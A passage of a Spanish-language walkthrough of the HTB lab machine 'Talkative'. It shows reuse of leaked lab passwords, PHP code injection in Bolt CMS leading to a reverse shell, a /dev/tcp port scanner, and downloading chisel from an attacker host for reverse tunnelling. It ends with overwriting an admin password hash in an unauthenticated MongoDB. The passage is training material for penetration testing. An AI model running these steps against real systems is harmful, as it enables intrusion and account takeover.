     1055  08-14-2021 23:16   metadata.json
      433  08-14-2021 23:16   xdata.json
       48  08-14-2021 23:16   data.bin
       50  08-14-2021 23:16   01 empty/analysis
---------                     -------
     4303                     7 files

<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> <span class="mtku">bolt-administration.omv.zip</span>
Archive:  bolt-administration.omv.zip
  inflating: META-INF/MANIFEST.MF
  inflating: meta
  inflating: index.html
  inflating: metadata.json
  inflating: xdata.json
  inflating: data.bin
  inflating: 01 empty/analysis
</code></pre></div><p>Ahora tenemos algunos archivos JSON. Si examinamos <code>xdata.json</code>, podremos encontrar algunas contraseñas para los usuarios <code>matt</code>, <code>janit</code> y <code>saul</code> (los que vimos antes):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">xdata.json</span> | <span class="code-dark-green">jq</span>
<span class="code-white">{</span>
<span class="code-white">  <span class="code-blue">"A"<span class="code-white">: {</span>
<span class="code-white">    <span class="code-blue">"labels"<span class="code-white">: [</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>0<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"Username"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"Username"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ],</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>1<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"matt@talkative.htb"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"matt@talkative.htb"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ],</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>2<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"janit@talkative.htb"<span class="code-white">,</span>  
<span class="code-white">        <span class="code-dark-green">"janit@talkative.htb"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ],</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>3<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"saul@talkative.htb"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"saul@talkative.htb"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ]</span>
<span class="code-white">    ]</span>
<span class="code-white">  },</span>
<span class="code-white">  <span class="code-blue">"B"<span class="code-white">: {</span>
<span class="code-white">    <span class="code-blue">"labels"<span class="code-white">: [</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>0<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"Password"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"Password"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ],</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>1<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"jeO09ufhWD&lt;s"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"jeO09ufhWD&lt;s"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ],</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>2<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"bZ89h}V&lt;S_DA"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">"bZ89h}V&lt;S_DA"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ],</span>
<span class="code-white">      [</span>
<span class="code-white">        </span>3<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">")SQWGm&gt;9KHEA"<span class="code-white">,</span>
<span class="code-white">        <span class="code-dark-green">")SQWGm&gt;9KHEA"<span class="code-white">,</span>
<span class="code-white">        </span>false
<span class="code-white">      ]</span>
<span class="code-white">    ]</span>
<span class="code-white">  },</span>
<span class="code-white">  <span class="code-blue">"C"<span class="code-white">: {</span>
<span class="code-white">    <span class="code-blue">"labels"<span class="code-white">: []</span>
<span class="code-white">  }</span>
<span class="code-white">}
</code></pre></div><p>Podemos intentar acceder a Rocket.Chat usando estos nombres de usuario y contraseñas (todas las combinaciones), y ninguna funciona&mldr;</p><h3 id="enumerando-más-servicios">Enumerando más servicios</h3><p>Usemos <code>ffuf</code> para enumerar algunas rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://talkative.htb/FUZZ -t 1  

<span class="code-dark-green">[Status: 200, Size: 15838, Words: 2314, Lines: 258, Duration: 243ms]</span>
    * FUZZ: search

<span class="code-dark-green">[Status: 200, Size: 18466, Words: 2526, Lines: 316, Duration: 285ms]</span>
    * FUZZ: products

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 167ms]</span>
    * FUZZ: en

<span class="code-dark-blue">[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 132ms]</span>
    * FUZZ: files

<span class="code-dark-green">[Status: 200, Size: 16163, Words: 2342, Lines: 264, Duration: 240ms]</span>
    * FUZZ: page

<span class="code-dark-green">[Status: 200, Size: 18386, Words: 2509, Lines: 316, Duration: 167ms]</span>
    * FUZZ: people

<span class="code-dark-green">[Status: 200, Size: 18466, Words: 2526, Lines: 316, Duration: 201ms]</span>
    * FUZZ: product

<span class="code-dark-green">[Status: 200, Size: 16163, Words: 2342, Lines: 264, Duration: 191ms]</span>
    * FUZZ: pages

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 119ms]</span>
    * FUZZ: de

<span class="code-dark-green">[Status: 200, Size: 37217, Words: 5077, Lines: 618, Duration: 218ms]</span>
    * FUZZ: homepage

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 174ms]</span>
    * FUZZ: fr

<span class="code-dark-blue">[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 186ms]</span>
    * FUZZ: assets

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 166ms]</span>
    * FUZZ: it

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 131ms]</span>
    * FUZZ: nl

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 141ms]</span>
    * FUZZ: es

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 128ms]</span>
    * FUZZ: pl

<span class="code-dark-blue">[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 261ms]</span>
    * FUZZ: thumbs

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 90ms]</span>
    * FUZZ: ru

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 176ms]</span>
    * FUZZ: ja

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 91ms]</span>
    * FUZZ: hu

<span class="code-dark-blue">[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 177ms]</span>
    * FUZZ: theme

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 149ms]</span>
    * FUZZ: is

<span class="code-dark-green">[Status: 200, Size: 18386, Words: 2509, Lines: 316, Duration: 166ms]</span>
    * FUZZ: person

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 122ms]</span>
    * FUZZ: nb

<span class="code-dark-blue">[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 163ms]</span>
    * FUZZ: bundles

<span class="code-dark-blue">[Status: 301, Size: 342, Words: 60, Lines: 12, Duration: 119ms]</span>
    * FUZZ: nn

<span class="code-dark-blue">[Status: 301, Size: 354, Words: 60, Lines: 12, Duration: 164ms]</span>
    * FUZZ: pt_BR

<span class="code-dark-blue">[Status: 302, Size: 290, Words: 60, Lines: 12, Duration: 152ms]</span>
    * FUZZ: bolt

<span class="code-dark-green">[Status: 200, Size: 37212, Words: 5089, Lines: 616, Duration: 285ms]</span>
    * FUZZ:

<span class="code-dark-green">[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 402ms]</span>
    * FUZZ: 11906

<span class="code-dark-blue">[Status: 301, Size: 623, Words: 85, Lines: 16, Duration: 169ms]</span>
    * FUZZ: nl_NL

<span class="code-dark-yellow">[Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 150ms]</span>
    * FUZZ: server-status
</code></pre></div><p>Vemos <code>/bolt</code>. Si visitamos este sitio, somos redirigidos a un formulario de inicio de sesión para Bolt CMS:</p><p><img src="/images/HTB/Talkative/Talkative-7.png" alt="Talkative 7"></p><p>Probabdo nuevamente las credenciales anteriores, descubrimos que el nombre de usuario <code>admin</code> y contraseña <code>jeO09ufhWD&lt;s</code> funcionan (el nombre de usuario era una suposición):</p><p><img src="/images/HTB/Talkative/Talkative-8.png" alt="Talkative 8"></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Dado que somos <code>admin</code> (o <code>saul</code>, como se muestra en la esquina superior derecha), probablemente podamos hacer algunos cambios críticos en el servicio. Por ejemplo, hay una sección de &ldquo;<em>Configuration</em>&rdquo;:</p><p><img src="/images/HTB/Talkative/Talkative-9.png" alt="Talkative 9"></p><p>Pinchando en &ldquo;<em>All configuration files</em>&rdquo;, veremos esto:</p><p><img src="/images/HTB/Talkative/Talkative-10.png" alt="Talkative 10"></p><p>Y aquí podemos elegir cualquier archivo PHP, como <code>bundles.php</code>:</p><p><img src="/images/HTB/Talkative/Talkative-11.png" alt="Talkative 11"></p><p>En este punto, podemos intentar obtener ejecución remota de comandos añadiendo el siguiente código PHP:</p><p><img src="/images/HTB/Talkative/Talkative-12.png" alt="Talkative 12"></p><p>Aquí lo tenemos:</p><p><img src="/images/HTB/Talkative/Talkative-13.png" alt="Talkative 13"></p><p>Vamos a conseguir otra <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.155.
Ncat: Connection from 10.10.11.155:34606.
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@e0ad934a50c1:/var/www/talkative.htb/bolt/public$ cd /
cd /
www-data@e0ad934a50c1:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@e0ad934a50c1:/$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@e0ad934a50c1:/$ export TERM=xterm
www-data@e0ad934a50c1:/$ export SHELL=bash
www-data@e0ad934a50c1:/$ stty rows 50 columns 158
</code></pre></div><p>Y volvemos a estar en otro contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@e0ad934a50c1:/$ hostname -i
172.17.0.16
www-data@e0ad934a50c1:/$ ls -la
total 80
drwxr-xr-x   1 root root 4096 Feb  8 21:05 .
drwxr-xr-x   1 root root 4096 Feb  8 21:05 ..
-rwxr-xr-x   1 root root    0 Feb  8 21:05 .dockerenv  
drwxr-xr-x   1 root root 4096 Mar  6  2022 bin
drwxr-xr-x   2 root root 4096 Dec 11  2021 boot
drwxr-xr-x   5 root root  340 Feb  8 21:05 dev
drwxr-xr-x   1 root root 4096 Feb  8 21:05 etc
drwxr-xr-x   2 root root 4096 Dec 11  2021 home
drwxr-xr-x   1 root root 4096 Mar  1  2022 lib
drwxr-xr-x   2 root root 4096 Feb 28  2022 lib64
drwxr-xr-x   2 root root 4096 Feb 28  2022 media
drwxr-xr-x   2 root root 4096 Feb 28  2022 mnt
drwxr-xr-x   2 root root 4096 Feb 28  2022 opt
dr-xr-xr-x 407 root root    0 Feb  8 21:05 proc
drwx------   1 root root 4096 Mar  6  2022 root
drwxr-xr-x   1 root root 4096 Mar  1  2022 run
drwxr-xr-x   1 root root 4096 Mar  1  2022 sbin
drwxr-xr-x   2 root root 4096 Feb 28  2022 srv
dr-xr-xr-x  13 root root    0 Feb  8 21:05 sys
drwxrwxrwt   1 root root 4096 Feb  8 23:52 tmp
drwxr-xr-x   1 root root 4096 Feb 28  2022 usr
drwxr-xr-x   1 root root 4096 Mar  1  2022 var
</code></pre></div><h3 id="enumeración-de-red">Enumeración de red</h3><p>Desde aquí podemos intentar enumerar los puertos internos de la máquina. También podríamos haber probado desde el primer contenedor, pero a partir de ahí no había visibilidad (obsérvese que la dirección IP del primer contenedor es <code>172.18.0.2</code> y la dirección IP del contenedor actual es <code>172.17.0.16</code>, que está en otro segmento de red).</p><p>Para enumerar, podemos escribir un <em>script</em> sencillo en Bash:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk1">ip</span><span class="mtk5">=</span><span class="mtk9 mtki">$1</span>

<span class="mtk5">for</span><span class="mtk1"> port </span><span class="mtk5">in</span><span class="mtk1"> {1..65535}; </span><span class="mtk5">do</span>
<span class="mtk1">        timeout </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk4">echo</span><span class="mtk1"> </span><span class="mtk5">2&gt;</span><span class="mtk4">/dev/null</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">/dev/tcp/</span><span class="mtk1">$ip</span><span class="mtk4">/</span><span class="mtk1">$port &amp;&amp; </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$ip</span><span class="mtk4">:</span><span class="mtk1">$port</span><span class="mtk4"> OPEN"</span><span class="mtk1"> &amp;</span>  
<span class="mtk5">done</span>
<span class="mtk7">wait</span>
</code></pre></div><p>La máquina <em>host</em> estará en <code>172.17.0.1</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@33964658334d:/$ cd /tmp
www-data@33964658334d:/tmp$ nano port_scan.sh
www-data@33964658334d:/tmp$ bash port_scan.sh 172.17.0.1  
172.17.0.1:22 OPEN
172.17.0.1:80 OPEN
172.17.0.1:6002 OPEN
172.17.0.1:6003 OPEN
172.17.0.1:6000 OPEN
172.17.0.1:6001 OPEN
172.17.0.1:6005 OPEN
172.17.0.1:6008 OPEN
172.17.0.1:6007 OPEN
172.17.0.1:6009 OPEN
172.17.0.1:6004 OPEN
172.17.0.1:6011 OPEN
172.17.0.1:6013 OPEN
172.17.0.1:6006 OPEN
172.17.0.1:6010 OPEN
172.17.0.1:6014 OPEN
172.17.0.1:6012 OPEN
172.17.0.1:6015 OPEN
172.17.0.1:8081 OPEN
172.17.0.1:8082 OPEN
172.17.0.1:8080 OPEN
^C
</code></pre></div><p>Hay muchos puertos abiertos, pero el interesante es el puerto 22 (SSH), que no está expuesto.</p><h3 id="acceso-mediante-ssh">Acceso mediante SSH</h3><p>En este punto, podríamos usar <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> para aplicar un reenvío de puertos, pero afortunadamente, <code>ssh</code> está instalado en el contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@e0ad934a50c1:/tmp$ which ssh  
/usr/bin/ssh
</code></pre></div><p>Intentemos acceder reutilizando las credenciales anteriores (<code>saul:jeO09ufhWD&lt;s</code> funciona):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@e0ad934a50c1:/tmp$ ssh saul@172.17.0.1  
saul@172.17.0.1's password:
saul@talkative:~$ cat user.txt
0ec2086f5500813982778db81f66c29c
</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Estos son todos los puertos internos abiertos con <code>netstat -nat</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">saul@talkative:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8082            0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.1:55454        172.17.0.2:27017        TIME_WAIT
tcp        0      0 172.17.0.1:22           172.17.0.16:45724       ESTABLISHED  
tcp        0      1 10.10.11.155:36560      1.1.1.1:53              SYN_SENT
tcp        0      0 172.17.0.1:55456        172.17.0.2:27017        TIME_WAIT
tcp6       0      0 :::8080                 :::*                    LISTEN
tcp6       0      0 :::8081                 :::*                    LISTEN
tcp6       0      0 :::8082                 :::*                    LISTEN
</code></pre></div><p>Hay uno que parece prometedor: 27017 (MongoDB).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">saul@talkative:~$ curl 172.17.0.2:27017
It looks like you are trying to access MongoDB over HTTP on the native driver port.  
</code></pre></div><p>Ahora es el momento de subir <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> y aplicar un reenvío de puertos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">saul@talkative:/tmp$ wget -q 10.10.17.44/chisel
saul@talkative:/tmp$ chmod +x chisel
saul@talkative:/tmp$ ./chisel client 10.10.17.44:1234 R:27017:172.17.0.2:27017  
client: Connecting to ws://10.10.17.44:1234
client: Connected (Latency 82.288713ms)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.155 - - [] "GET /chisel HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

<span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server --reverse -p 1234
server: Reverse tunnelling enabled
server: Fingerprint BZ0iGpzJ2ZVb07KJAZ5ZhEqDmyMzgzKk1IAqSx07a+k=
server: Listening on http://0.0.0.0:1234
server: session#1: tun: proxy#R:27017=&gt;172.17.0.2:27017: Listening  
</code></pre></div><p>Desde nuestra máquina, tenemos el puerto 27017 abierto, que se redirige a <code>172.17.0.2:27017</code>. Usando <code>mongosh</code> podemos interactuar con el gestor de bases de datos (no se necesitan credenciales):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">mongosh</span> --quiet
rs0 [direct: primary] test&gt; show dbs;  
<span class="code-white">admin</span>   104.00 KiB
<span class="code-white">config</span>  124.00 KiB
<span class="code-white">local</span>    11.43 MiB
<span class="code-white">meteor</span>    4.65 MiB
</code></pre></div><h3 id="enumeración-de-mongodb">Enumeración de MongoDB</h3><p>Las primeras tres bases de datos parecen ser predeterminadas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>rs0 [direct: primary] test&gt; use admin;
switched to db admin
rs0 [direct: primary] admin&gt; show collections;
<span class="code-grey">system.keys</span>
<span class="code-grey">system.version</span>
rs0 [direct: primary] admin&gt; use config;
switched to db config
rs0 [direct: primary] config&gt; show collections;  
<span class="code-white">image_collection</span>
<span class="code-white">transactions</span>
<span class="code-grey">system.sessions</span>
rs0 [direct: primary] config&gt; use local;
switched to db local
rs0 [direct: primary] local&gt; show collections;
<span class="code-white">oplog.rs</span>
<span class="code-white">replset.election</span>
<span class="code-white">replset.minvalid</span>
<span class="code-white">replset.oplogTruncateAfterPoint</span>
<span class="code-white">startup_log</span>
<span class="code-grey">system.replset</span>
<span class="code-grey">system.rollback.id</span>
</code></pre></div><p>Entonces, examinemos <code>meteor</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>rs0 [direct: primary] local&gt; use meteor;
switched to db meteor
rs0 [direct: primary] meteor&gt; show collections;  
<span class="code-white">_raix_push_app_tokens</span>
<span class="code-white">_raix_push_notifications</span>
<span class="code-white">instances</span>
<span class="code-white">meteor_accounts_loginServiceConfiguration</span>
<span class="code-white">meteor_oauth_pendingCredentials</span>
<span class="code-white">meteor_oauth_pendingRequestTokens</span>
<span class="code-white">migrations</span>
<span class="code-white">rocketchat__trash</span>
<span class="code-white">rocketchat_apps</span>
<span class="code-white">rocketchat_apps_logs</span>
<span class="code-white">rocketchat_apps_persistence</span>
<span class="code-white">rocketchat_avatars</span>
<span class="code-white">rocketchat_avatars.chunks</span>
<span class="code-white">rocketchat_avatars.files</span>
<span class="code-white">rocketchat_credential_tokens</span>
<span class="code-white">rocketchat_cron_history</span>
<span class="code-white">rocketchat_custom_emoji</span>
<span class="code-white">rocketchat_custom_sounds</span>
<span class="code-white">rocketchat_custom_user_status</span>
<span class="code-white">rocketchat_export_operations</span>
<span class="code-white">rocketchat_federation_dns_cache</span>
<span class="code-white">rocketchat_federation_keys</span>
<span class="code-white">rocketchat_federation_room_events</span>
<span class="code-white">rocketchat_federation_servers</span>
<span class="code-white">rocketchat_import</span>
<span class="code-white">rocketchat_integration_history</span>
<span class="code-white">rocketchat_integrations</span>
<span class="code-white">rocketchat_invites</span>
<span class="code-white">rocketchat_livechat_agent_activity</span>
<span class="code-white">rocketchat_livechat_custom_field</span>
<span class="code-white">rocketchat_livechat_department</span>
<span class="code-white">rocketchat_livechat_department_agents</span>
<span class="code-white">rocketchat_livechat_external_message</span>
<span class="code-white">rocketchat_livechat_inquiry</span>
<span class="code-white">rocketchat_livechat_office_hour</span>
<span class="code-white">rocketchat_livechat_page_visited</span>
<span class="code-white">rocketchat_livechat_trigger</span>
<span class="code-white">rocketchat_livechat_visitor</span>
<span class="code-white">rocketchat_message</span>
<span class="code-white">rocketchat_message_read_receipt</span>
<span class="code-white">rocketchat_oauth_apps</span>
<span class="code-white">rocketchat_oembed_cache</span>
<span class="code-white">rocketchat_permissions</span>
<span class="code-white">rocketchat_reports</span>
<span class="code-white">rocketchat_roles</span>
<span class="code-white">rocketchat_room</span>
<span class="code-white">rocketchat_sessions</span>
<span class="code-white">rocketchat_settings</span>
<span class="code-white">rocketchat_smarsh_history</span>
<span class="code-white">rocketchat_statistics</span>
<span class="code-white">rocketchat_subscription</span>
<span class="code-white">rocketchat_uploads</span>
<span class="code-white">rocketchat_user_data_files</span>
<span class="code-white">rocketchat_webdav_accounts</span>
<span class="code-white">ufsTokens</span>
<span class="code-white">users</span>
<span class="code-white">usersSessions</span>
<span class="code-white">view_livechat_queue_status</span>                 [view]
<span class="code-grey">system.views</span>
</code></pre></div><p>Mucho más interesante. Por ejemplo, veamos qué hay en la colección <code>users</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>rs0 [direct: primary] meteor&gt; db.users.find().pretty();
[
  {
    _id: <span class="code-dark-green">'rocket.cat'</span>,
    createdAt: ISODate("2021-08-10T19:44:00.224Z"),
    avatarOrigin: <span class="code-dark-green">'local'</span>,
    name: <span class="code-dark-green">'Rocket.Cat'</span>,
    username: <span class="code-dark-green">'rocket.cat'</span>,
    status: <span class="code-dark-green">'online'</span>,
    statusDefault: <span class="code-dark-green">'online'</span>,
    utcOffset: <span class="code-dark-yellow">0</span>,
    active: <span class="code-dark-yellow">true</span>,
    type: <span class="code-dark-green">'bot'</span>,
    _updatedAt: ISODate("2021-08-10T19:44:00.615Z"),
    roles: [ <span class="code-dark-green">'bot'</span> ]
  },
  {
    _id: <span class="code-dark-green">'ZLMid6a4h5YEosPQi'</span>,
    createdAt: ISODate("2021-08-10T19:49:48.673Z"),
    services: {
      password: {
        bcrypt: <span class="code-dark-green">'$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y'</span>  
      },
      email: {
        verificationTokens: [
          {
            token: <span class="code-dark-green">'dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w'</span>,
            address: <span class="code-dark-green">'saul@talkative.htb'</span>,
            when: ISODate("2021-08-10T19:49:48.738Z")
          }
        ]
      },
      resume: { loginTokens: [] }
    },
    emails: [ { address: <span class="code-dark-green">'saul@talkative.htb'</span>, verified: <span class="code-dark-yellow">false</span> } ],
    type: <span class="code-dark-green">'user'</span>,
    status: <span class="code-dark-green">'offline'</span>,
    active: <span class="code-dark-yellow">true</span>,
    _updatedAt: ISODate("2023-02-08T21:16:12.302Z"),
    roles: [ <span class="code-dark-green">'admin'</span> ],
    name: <span class="code-dark-green">'Saul Goodman'</span>,
    lastLogin: ISODate("2022-03-15T17:06:56.543Z"),
    statusConnection: <span class="code-dark-green">'offline'</span>,
    username: <span class="code-dark-green">'admin'</span>,
    utcOffset: <span class="code-dark-yellow">0</span>
  }
]
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Hay un nombre de usuario llamado <code>admin</code> (realmente, Saul Goodman). Se puede ver un <em>hash</em> de una contraseña (que usa <code>bcrypt</code>). Podríamos tratar de romper este <em>hash</em> con <code>john</code>, pero es inútil ya que tenemos acceso a la base de datos. Podríamos incluso cambiar este <em>hash</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; import bcrypt
&gt;&gt;&gt; bcrypt.hashpw(b'asdf', bcrypt.gensalt(10))
b'$2b$10$tAQPgGNAvArtMroi/yrUhON.xMjegn74ppD0cItYTlT2wxzGuB/Pe'  
</code></pre></div><p>Ahora, <code>admin</code> debería tener <code>asdf</code> como contraseña:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>rs0 [direct: primary] meteor&gt; db.users.updateOne({ <span class="code-dark-yellow">_id</span>: <span class="code-dark-green">'ZLMid6a4h5YEosPQi'</span> }, { <span class="code-dark-yellow">$set</span>: { <span class="code-dark-yellow">services</span>: { <span class="code-dark-yellow">password</span>: { <span class="code-dark-yellow">bcrypt</span>: <span class="code-dark-green">'$2b$12$XxDxpzkQHvcOP55Y/WZ6GuHNKdaCX</span>  
<span class="code-dark-green">u6wz7P74naKv3x3cYeg9oLDK'</span> } } } });
{
  acknowledged: <span class="code-dark-yellow">true</span>,
  insertedId: <span class="code-white">null</span>,
  matchedCount: <span class="code-dark-yellow">1</span>,
  modifiedCount: <span class="code-dark-yellow">1</span>,
  upsertedCount: <span class="code-dark-yellow">0</span>
}
</span>rs0 [direct: primary] meteor&gt; db.users.find({}, { <span class="code-dark-yellow">services</span>: <span class="code-dark-yellow">1</span> }).pretty();
[
  { _id: <span class="code-dark-green">'rocket.cat'</span> },
  {
    _id: <span class="code-dark-green">'ZLMid6a4h5YEosPQi'</span>,
    services: {
      password: {
        bcrypt: <span class="code-dark-green">'$2b$12$XxDxpzkQHvcOP55Y/WZ6GuHNKdaCXu6wz7P74naKv3x3cYeg9oLDK'</span>
      }
    }
  }
]
